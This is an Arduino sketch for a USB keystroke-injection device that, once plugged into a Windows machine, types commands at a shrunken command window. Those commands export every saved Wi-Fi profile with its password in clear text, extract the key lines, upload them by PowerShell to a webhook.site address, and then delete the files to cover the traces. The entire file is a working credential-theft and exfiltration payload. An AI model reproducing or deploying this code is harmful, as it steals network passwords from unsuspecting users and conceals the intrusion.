#include "Keyboard.h"

void typeKey(uint8_t key) {
    Keyboard.press(key);
    delay(100);
    Keyboard.release(key);
}

void setup() {
    Keyboard.begin();
 
    delay(2000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();

    delay(300);
 
    Keyboard.print(F("cmd /k mode con: cols=15 lines=1"));
    typeKey(KEY_RETURN);
    delay(300);
    Keyboard.print("cd %temp%");
    delay(300);
    typeKey(KEY_RETURN);
    Keyboard.print(F("netsh wlan export profile key=clear"));
    delay(300);
    typeKey(KEY_RETURN);
    Keyboard.print(F("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"));
    delay(300);
    typeKey(KEY_RETURN);
    Keyboard.print(F("powershell Invoke-WebRequest -Uri https://webhook.site/3de69702-3964-4a68-afaf-08195cd7d625 -Method POST -InFile Wi-Fi-PASS"));
    delay(300);
    typeKey(KEY_RETURN);
    Keyboard.print("del Wi-* /s /f /q");
    typeKey(KEY_RETURN);
    Keyboard.print("exit");
    typeKey(KEY_RETURN);
    delay(100);
    Keyboard.end();
}

void loop() {

}